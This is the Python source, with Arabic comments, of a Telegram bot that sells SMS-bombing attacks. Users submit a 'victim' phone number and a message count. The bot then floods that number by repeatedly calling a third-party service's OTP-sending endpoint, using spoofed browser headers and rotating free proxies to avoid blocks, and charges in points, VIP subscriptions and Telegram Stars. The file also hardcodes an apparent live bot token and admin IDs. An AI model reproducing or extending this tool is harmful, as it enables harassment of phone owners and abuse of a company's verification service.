import logging
import sqlite3
import html
import asyncio
import json
import os
import aiohttp
import random
from datetime import datetime, timedelta
from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    InputFile
)
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters,
    CallbackQueryHandler,
    ConversationHandler
)
from telegram.error import BadRequest

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# ⚙️ إعدادات البوت والتهيئة (يجب تعديلها)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

BOT_TOKEN = "7637690071:AAE-MZYASnMZx3iq52aheHbDcq9yE2VQUjk"  # ⚠️ توكن البوت
ADMIN_ID = 8287678319  # ⚠️ آيدي الأدمن
LOG_CHANNEL_ID = -1003626386204  # ⚠️ آيدي القناة الخاصة بالسجلات (يجب أن يكون البوت مشرفاً فيها)
FORCE_CHANNEL_USERNAME = "@Cnejsjwn"  # ⚠️ يوزر قناة الاشتراك الإجباري (بدون @ في الرابط، مع @ هنا)
FORCE_CHANNEL_URL = "https://t.me/Cnejsjwn" # رابط القناة

# إعدادات الرشق
SMS_PER_POINT = 10  # كل 1 نقطة = 10 رسائل
MAX_FREE_POINTS = 50  # الحد الأقصى للمجاني (50 نقطة = 500 رسالة)

# مراحل المحادثات
STATE_TRANSFER_ID, STATE_TRANSFER_AMOUNT = range(2)
STATE_ATTACK_NUMBER, STATE_ATTACK_AMOUNT = range(2, 4)
STATE_BROADCAST, STATE_RESTORE_DB = range(4, 6)

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🌐 نظام البروكسي (Proxy Manager)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
class ProxyManager:
    def __init__(self):
        self.proxies = []
        # يمكنك إضافة بروكسياتك هنا يدوياً أو سيقوم البوت بجلب مجانية
        self.proxies = [
            # "http://user:pass@ip:port",
        ]

    async def fetch_free_proxies(self):
        """جلب بروكسيات مجانية لتفادي الحظر"""
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all') as resp:
                    if resp.status == 200:
                        text = await resp.text()
                        self.proxies = ["http://" + p.strip() for p in text.split('\n') if p.strip()]
                        logger.info(f"✅ تم تحميل {len(self.proxies)} بروكسي.")
        except Exception as e:
            logger.error(f"فشل جلب البروكسيات: {e}")

    def get_random_proxy(self):
        if not self.proxies:
            return None
        return random.choice(self.proxies)

proxy_manager = ProxyManager()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🗄️ نظام قاعدة البيانات (Database Manager)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class DatabaseManager:
    def __init__(self, db_name="zaem_data.db"):
        self.db_name = db_name
        self.conn = sqlite3.connect(db_name, check_same_thread=False)
        self.cursor = self.conn.cursor()
        self.create_tables()

    def create_tables(self):
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                full_name TEXT,
                points INTEGER DEFAULT 0,
                is_vip INTEGER DEFAULT 0,  -- 0: No, 1: Yes
                vip_expiry TEXT,
                is_banned INTEGER DEFAULT 0,
                joined_date TEXT
            )
        ''')
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS transactions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                action_type TEXT,
                amount INTEGER,
                details TEXT,
                timestamp TEXT
            )
        ''')
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS settings (
                key TEXT PRIMARY KEY,
                value TEXT
            )
        ''')
        self.conn.commit()

    # --- إدارة المستخدمين ---
    def get_user(self, user_id):
        self.cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
        return self.cursor.fetchone()

    def add_user(self, user_id, username, full_name):
        if not self.get_user(user_id):
            date = datetime.now().isoformat()
            self.cursor.execute(
                "INSERT INTO users (user_id, username, full_name, points, joined_date) VALUES (?, ?, ?, 0, ?)",
                (user_id, username, full_name, date)
            )
            self.conn.commit()
            return True
        return False

    def update_points(self, user_id, amount):
        self.cursor.execute("UPDATE users SET points = points + ? WHERE user_id = ?", (amount, user_id))
        self.conn.commit()

    def set_vip(self, user_id, days=None):
        # days=None يعني مدى الحياة
        if days:
            expiry = (datetime.now() + timedelta(days=days)).isoformat()
        else:
            expiry = "LIFETIME"
        self.cursor.execute("UPDATE users SET is_vip = 1, vip_expiry = ? WHERE user_id = ?", (expiry, user_id))
        self.conn.commit()

    def check_vip(self, user_id):
        user = self.get_user(user_id)
        if not user or not user[4]: # index 4 is is_vip
            return False
        
        expiry = user[5]
        if expiry == "LIFETIME":
            return True
        
        if datetime.fromisoformat(expiry) > datetime.now():
            return True
        else:
            # انتهاء الاشتراك
            self.cursor.execute("UPDATE users SET is_vip = 0, vip_expiry = NULL WHERE user_id = ?", (user_id,))
            self.conn.commit()
            return False

    def ban_user(self, user_id, status=1):
        self.cursor.execute("UPDATE users SET is_banned = ? WHERE user_id = ?", (status, user_id))
        self.conn.commit()

    def get_all_users_ids(self):
        self.cursor.execute("SELECT user_id FROM users")
        return [row[0] for row in self.cursor.fetchall()]

    # --- السجلات والنسخ الاحتياطي ---
    def log_transaction(self, user_id, action, amount, details):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.cursor.execute(
            "INSERT INTO transactions (user_id, action_type, amount, details, timestamp) VALUES (?, ?, ?, ?, ?)",
            (user_id, action, amount, details, timestamp)
        )
        self.conn.commit()
        return timestamp

    def export_json(self):
        """تصدير قاعدة البيانات بالكامل لملف JSON"""
        data = {
            "users": [],
            "transactions": []
        }
        
        users = self.cursor.execute("SELECT * FROM users").fetchall()
        for u in users:
            data["users"].append({
                "user_id": u[0], "username": u[1], "full_name": u[2],
                "points": u[3], "is_vip": u[4], "vip_expiry": u[5],
                "is_banned": u[6], "joined_date": u[7]
            })
            
        txs = self.cursor.execute("SELECT * FROM transactions").fetchall()
        for t in txs:
            data["transactions"].append({
                "id": t[0], "user_id": t[1], "action_type": t[2],
                "amount": t[3], "details": t[4], "timestamp": t[5]
            })
            
        with open("backup.json", "w", encoding='utf-8') as f:
            json.dump(data, f, indent=4, ensure_ascii=False)
        return "backup.json"

    def import_json(self, file_path):
        """استعادة قاعدة البيانات من ملف JSON"""
        try:
            with open(file_path, "r", encoding='utf-8') as f:
                data = json.load(f)
            
            # تنظيف الحالي
            self.cursor.execute("DELETE FROM users")
            self.cursor.execute("DELETE FROM transactions")
            
            for u in data["users"]:
                self.cursor.execute(
                    "INSERT INTO users VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                    (u["user_id"], u["username"], u["full_name"], u["points"], 
                     u["is_vip"], u["vip_expiry"], u["is_banned"], u["joined_date"])
                )
            
            for t in data["transactions"]:
                self.cursor.execute(
                    "INSERT INTO transactions VALUES (?, ?, ?, ?, ?, ?)",
                    (t["id"], t["user_id"], t["action_type"], t["amount"], 
                     t["details"], t["timestamp"])
                )
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Import Error: {e}")
            return False

db = DatabaseManager()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🚀 محرك الرشق (Attack Engine) & Queue System
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

attack_queue = asyncio.Queue()

async def attack_worker(app: Application):
    """العامل الذي يعالج الطلبات في الخلفية"""
    while True:
        # الحصول على المهمة
        task = await attack_queue.get()
        user_id, number, count_sms, chat_id = task
        
        logger.info(f"Starting attack for {user_id} -> {number} ({count_sms} SMS)")
        
        try:
            # إشعار المستخدم ببدء التنفيذ
            await app.bot.send_message(chat_id, f"🚀 <b>بدأ تنفيذ طلبك!</b>\nجاري إرسال {count_sms} رسالة للرقم {number}...", parse_mode="HTML")
            
            # تنفيذ الرشق
            success_count = await execute_sms_spam(number, count_sms)
            
            # إشعار الانتهاء
            await app.bot.send_message(
                chat_id, 
                f"✅ <b>تم الانتهاء!</b>\n"
                f"📱 الرقم: <code>{number}</code>\n"
                f"📨 تم الإرسال: {success_count}/{count_sms}\n"
                f"شكراً لاستخدامك البوت.",
                parse_mode="HTML"
            )
            
            # تسجيل العملية في القناة
            await log_to_channel(app, f"🎯 <b>عملية رشق ناجحة</b>\n👤 المستخدم: {user_id}\n📱 الهدف: {number}\n🔢 العدد: {success_count}")

        except Exception as e:
            logger.error(f"Attack failed: {e}")
            await app.bot.send_message(chat_id, "⚠️ حدث خطأ أثناء تنفيذ الهجوم، تمت إعادة النقاط.")
            # هنا يمكن إضافة منطق لإرجاع النقاط في حال الفشل
        
        finally:
            attack_queue.task_done()
            await asyncio.sleep(1) # راحة بسيطة بين الطلبات

async def execute_sms_spam(number, count):
    """دالة الرشق باستخدام aiohttp"""
    sent = 0
    nu = '+2' # مفتاح الدولة
    target = nu + number
    
    headers = {
        'authority': 'api.twistmena.com',
        'accept': 'application/json, text/plain, */*',
        'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome Mobile Safari/537.36',
        'content-type': 'application/json',
        'origin': 'https://account.twistmena.com',
        'referer': 'https://account.twistmena.com/'
    }
    
    json_data = {'phoneNumber': target}
    
    async with aiohttp.ClientSession() as session:
        for _ in range(count):
            try:
                # استخدام بروكسي إذا وجد
                proxy = proxy_manager.get_random_proxy()
                
                async with session.post(
                    'https://api.twistmena.com/account/auth/phone/sendOtp',
                    headers=headers,
                    json=json_data,
                    proxy=proxy,
                    timeout=10
                ) as response:
                    text = await response.text()
                    if '"success":true' in text:
                        sent += 1
            except Exception as e:
                pass
            
            await asyncio.sleep(0.5) # تأخير بسيط لتجنب الحظر السريع جداً
            
    return sent

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🛠️ أدوات مساعدة
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def check_subscription(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """التحقق من الاشتراك الإجباري"""
    user_id = update.effective_user.id
    if user_id == ADMIN_ID: return True
    
    try:
        member = await context.bot.get_chat_member(chat_id=FORCE_CHANNEL_USERNAME, user_id=user_id)
        if member.status in ["left", "kicked"]:
            await update.message.reply_text(
                f"⚠️ <b>عذراً عزيزي!</b>\n\nيجب عليك الاشتراك في قناة البوت لاستخدامه.\n{FORCE_CHANNEL_URL}",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("تحقق من الاشتراك 🔄", callback_data="check_sub")]])
            )
            return False
        return True
    except BadRequest:
        # إذا كان البوت ليس مشرفاً في القناة أو اليوزر خطأ، نتجاوز
        return True
    except Exception:
        return True

async def log_to_channel(app, message):
    """إرسال السجلات للقناة الخاصة"""
    try:
        if LOG_CHANNEL_ID:
            await app.bot.send_message(LOG_CHANNEL_ID, message, parse_mode="HTML")
    except Exception as e:
        logger.error(f"Log Error: {e}")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🕹️ واجهة المستخدم (Handlers)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    db.add_user(user.id, user.username, user.first_name)
    
    if not await check_subscription(update, context):
        return

    # التحقق من الحظر
    db_user = db.get_user(user.id)
    if db_user[6]: # banned
        await update.message.reply_text("⛔ تم حظرك من استخدام هذا البوت.")
        return

    await send_main_menu(update, context)

async def send_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, edit=False):
    user = update.effective_user
    db_user = db.get_user(user.id)
    points = db_user[3]
    is_vip = db_user[4]
    vip_status = "👑 VIP" if is_vip else "مجاني"
    
    text = (
        f"👋 مرحباً {user.first_name}\n\n"
        f"🆔 الآيدي: <code>{user.id}</code>\n"
        f"💰 النقاط: <b>{points}</b>\n"
        f"🔰 الحالة: <b>{vip_status}</b>\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"تحكم في البوت من الأزرار أدناه:"
    )
    
    btns = [
        [InlineKeyboardButton("🚀 بدء الرشق", callback_data="start_attack"), InlineKeyboardButton("👤 حسابي", callback_data="my_profile")],
        [InlineKeyboardButton("💳 شحن رصيد", callback_data="payment_menu"), InlineKeyboardButton("👑 اشتراك VIP", callback_data="vip_menu")],
        [InlineKeyboardButton("💸 تحويل نقاط", callback_data="transfer_start")]
    ]
    
    if user.id == ADMIN_ID:
        btns.append([InlineKeyboardButton("⚙️ لوحة الإدارة", callback_data="admin_panel")])
    
    kb = InlineKeyboardMarkup(btns)
    
    if edit:
        await update.callback_query.edit_message_text(text, reply_markup=kb, parse_mode="HTML")
    else:
        await update.message.reply_text(text, reply_markup=kb, parse_mode="HTML")

# --- قائمة الرشق ---
async def start_attack_flow(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    # التحقق من الاشتراك مجدداً
    if not db.get_user(query.from_user.id):
        await query.edit_message_text("❌ حدث خطأ، اكتب /start")
        return ConversationHandler.END

    await query.edit_message_text(
        "📱 <b>إعداد الهجوم</b>\n\nأرسل رقم الضحية الآن (مثال: 01xxxxxxxxx):",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 إلغاء", callback_data="cancel")]])
    )
    return STATE_ATTACK_NUMBER

async def get_attack_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    number = update.message.text
    if not number.isdigit() or len(number) < 10:
        await update.message.reply_text("❌ رقم غير صالح! حاول مرة أخرى.")
        return STATE_ATTACK_NUMBER
    
    context.user_data['attack_number'] = number
    await update.message.reply_text(
        f"✅ الهدف: <code>{number}</code>\n\n"
        f"📩 كم عدد الرسائل التي تريد إرسالها؟\n"
        f"💡 تذكر: كل 1 نقطة = {SMS_PER_POINT} رسائل.",
        parse_mode="HTML"
    )
    return STATE_ATTACK_AMOUNT

async def get_attack_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        sms_count = int(update.message.text)
    except ValueError:
        await update.message.reply_text("❌ يرجى إرسال رقم صحيح.")
        return STATE_ATTACK_AMOUNT

    user_id = update.effective_user.id
    user_data = db.get_user(user_id)
    points_balance = user_data[3]
    is_vip = db.check_vip(user_id)
    
    required_points = sms_count // SMS_PER_POINT
    if sms_count % SMS_PER_POINT != 0:
        required_points += 1 # جبر الكسر

    # قيود المستخدم المجاني
    if not is_vip:
        max_sms_free = MAX_FREE_POINTS * SMS_PER_POINT
        if sms_count > max_sms_free:
            await update.message.reply_text(
                f"❌ <b>حد المستخدم المجاني هو {max_sms_free} رسالة فقط!</b>\n"
                f"👑 اشترك في VIP لإزالة الحدود.",
                parse_mode="HTML"
            )
            return STATE_ATTACK_AMOUNT
        
        # خصم النقاط للمجاني
        if points_balance < required_points:
            await update.message.reply_text(f"❌ رصيدك غير كافٍ. تحتاج {required_points} نقطة.")
            return STATE_ATTACK_AMOUNT
        
        db.update_points(user_id, -required_points)
        log_msg = f"➖ خصم {required_points} نقطة (رشق)"
    else:
        # الـ VIP لا يخصم منه نقاط (أو يمكن جعله يخصم، حسب رغبتك، سأجعله مجاني للـ VIP)
        required_points = 0
        log_msg = "👑 عملية VIP مجانية"

    # إضافة للطابور
    target_number = context.user_data['attack_number']
    
    # حساب الدور
    queue_pos = attack_queue.qsize() + 1
    est_minutes = queue_pos * 1 # دقيقة تقريبية لكل طلب
    
    await attack_queue.put((user_id, target_number, sms_count, update.effective_chat.id))
    
    # تسجيل
    db.log_transaction(user_id, "ATTACK", required_points, f"Target: {target_number}, SMS: {sms_count}")
    await log_to_channel(context.application, f"💣 <b>طلب رشق جديد</b>\n👤 من: {user_id} ({'VIP' if is_vip else 'Free'})\n📱 الهدف: {target_number}\n🔢 الرسائل: {sms_count}\n💰 التكلفة: {required_points}")

    await update.message.reply_text(
        f"✅ <b>تم استلام طلبك بنجاح!</b>\n\n"
        f"🔢 رقم الطلب: <code>#{random.randint(1000, 9999)}</code>\n"
        f"🚶‍♂️ دورك في الطابور: <b>{queue_pos}</b>\n"
        f"⏱️ الوقت المقدر: {est_minutes} دقيقة\n\n"
        f"سيتم إشعارك عند البدء والانتهاء.",
        parse_mode="HTML"
    )
    
    await send_main_menu(update, context)
    return ConversationHandler.END

# --- قائمة الدفع والـ VIP ---
async def payment_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    text = (
        "💳 <b>شحن الرصيد (يدوي)</b>\n\n"
        "العملة المقبولة: ⭐️ Telegram Stars\n"
        "اختر الباقة المناسبة:"
    )
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("⭐️ 20 نجمة (250 نقطة)", callback_data="pay_manual_20")],
        [InlineKeyboardButton("⭐️ 50 نجمة (600 نقطة)", callback_data="pay_manual_50")],
        [InlineKeyboardButton("🔙 رجوع", callback_data="main_menu")]
    ])
    await query.edit_message_text(text, reply_markup=kb, parse_mode="HTML")

async def vip_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    text = (
        "👑 <b>اشتراك VIP المميز</b>\n\n"
        "🔹 رشق لا نهائي بدون خصم نقاط\n"
        "🔹 أولوية في الطابور\n"
        "🔹 دعم فني خاص\n\n"
        "💵 السعر: <b>100 نجمة / شهرياً</b>"
    )
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("💎 طلب اشتراك VIP", callback_data="req_vip")],
        [InlineKeyboardButton("🔙 رجوع", callback_data="main_menu")]
    ])
    await query.edit_message_text(text, reply_markup=kb, parse_mode="HTML")

async def handle_manual_pay(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    user_id = query.from_user.id
    
    if data == "pay_manual_20":
        stars = 20; points = 250
    elif data == "pay_manual_50":
        stars = 50; points = 600
    elif data == "req_vip":
        stars = 100; points = "اشتراك VIP"
    else:
        return

    text = (
        f"⚠️ <b>تعليمات الدفع اليدوي</b>\n\n"
        f"1️⃣ قم بإرسال <b>{stars} ⭐️</b> كهدية لحساب المالك: @MO_3MK\n"
        f"2️⃣ انسخ هذا الآيدي: <code>{user_id}</code>\n"
        f"3️⃣ أرسل صورة الإيصال + الآيدي للمالك.\n\n"
        f"سيتم إضافة {points} لحسابك فور التحقق."
    )
    kb = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="main_menu")]])
    await query.edit_message_text(text, reply_markup=kb, parse_mode="HTML")

# --- لوحة الأدمن ---
async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if query.from_user.id != ADMIN_ID: return
    await query.answer()
    
    users_ids = db.get_all_users_ids()
    text = (
        f"⚙️ <b>لوحة القيادة</b>\n"
        f"👥 عدد المستخدمين: {len(users_ids)}\n"
        f"📥 الطابور الحالي: {attack_queue.qsize()} طلب\n"
    )
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("📢 إذاعة للكل", callback_data="admin_broadcast")],
        [InlineKeyboardButton("💾 تحميل نسخة احتياطية", callback_data="admin_backup_get")],
        [InlineKeyboardButton("♻️ استعادة نسخة احتياطية", callback_data="admin_backup_restore")],
        [InlineKeyboardButton("🛑 حظر مستخدم", callback_data="admin_ban_user")],
        [InlineKeyboardButton("🔙 خروج", callback_data="main_menu")]
    ])
    await query.edit_message_text(text, reply_markup=kb, parse_mode="HTML")

async def admin_backup_get(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    file_path = db.export_json()
    await context.bot.send_document(
        chat_id=ADMIN_ID,
        document=open(file_path, 'rb'),
        caption=f"💾 نسخة احتياطية كاملة\n📅 {datetime.now()}"
    )
    await query.answer("تم إرسال النسخة")

async def admin_broadcast_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.edit_message_text("📢 أرسل الرسالة التي تريد إذاعتها (نص أو صورة):")
    return STATE_BROADCAST

async def admin_perform_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    users = db.get_all_users_ids()
    count = 0
    await update.message.reply_text(f"جاري الإرسال لـ {len(users)} مستخدم...")
    
    for uid in users:
        try:
            await msg.copy(chat_id=uid)
            count += 1
            await asyncio.sleep(0.05) # تجنب الفلود
        except: pass
        
    await update.message.reply_text(f"✅ تمت الإذاعة لـ {count} مستخدم.")
    return ConversationHandler.END

async def admin_restore_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.edit_message_text("📂 أرسل ملف JSON الخاص بالنسخة الاحتياطية الآن:")
    return STATE_RESTORE_DB

async def admin_perform_restore(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document
    if not doc.file_name.endswith('.json'):
        await update.message.reply_text("❌ الملف يجب أن يكون JSON")
        return ConversationHandler.END
        
    file = await doc.get_file()
    await file.download_to_drive("restore.json")
    
    if db.import_json("restore.json"):
        await update.message.reply_text("✅ تم استعادة قاعدة البيانات بنجاح!")
        # إعادة تحميل البروكسيات أيضاً عند الاستعادة كإجراء إضافي
        await proxy_manager.fetch_free_proxies()
    else:
        await update.message.reply_text("❌ فشل استعادة البيانات. تأكد من صحة الملف.")
        
    return ConversationHandler.END

# --- الأزرار العامة ---
async def common_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    
    if data == "main_menu":
        await send_main_menu(update, context, edit=True)
    elif data == "cancel":
        await query.edit_message_text("❌ تم الإلغاء.")
        await send_main_menu(update, context)
    elif data == "check_sub":
        await check_subscription(update, context) # سيعيد إرسال القائمة إذا اشترك

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🔌 التشغيل الرئيسي
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def main():
    # تحميل البروكسيات عند البدء
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(proxy_manager.fetch_free_proxies())

    app = Application.builder().token(BOT_TOKEN).build()
    
    # المحادثات
    attack_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(start_attack_flow, pattern="^start_attack$")],
        states={
            STATE_ATTACK_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_attack_number)],
            STATE_ATTACK_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_attack_amount)],
        },
        fallbacks=[CallbackQueryHandler(common_callback, pattern="^cancel$")]
    )
    
    broadcast_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(admin_broadcast_start, pattern="^admin_broadcast$")],
        states={STATE_BROADCAST: [MessageHandler(filters.ALL & ~filters.COMMAND, admin_perform_broadcast)]},
        fallbacks=[]
    )
    
    restore_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(admin_restore_start, pattern="^admin_backup_restore$")],
        states={STATE_RESTORE_DB: [MessageHandler(filters.Document.ALL, admin_perform_restore)]},
        fallbacks=[]
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(attack_conv)
    app.add_handler(broadcast_conv)
    app.add_handler(restore_conv)
    
    # معالجات الدفع والأزرار
    app.add_handler(CallbackQueryHandler(payment_menu, pattern="^payment_menu$"))
    app.add_handler(CallbackQueryHandler(vip_menu, pattern="^vip_menu$"))
    app.add_handler(CallbackQueryHandler(handle_manual_pay, pattern="^(pay_manual_|req_vip)"))
    app.add_handler(CallbackQueryHandler(admin_panel, pattern="^admin_panel$"))
    app.add_handler(CallbackQueryHandler(admin_backup_get, pattern="^admin_backup_get$"))
    app.add_handler(CallbackQueryHandler(common_callback))

    # تشغيل عامل الطابور في الخلفية
    loop.create_task(attack_worker(app))

    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()

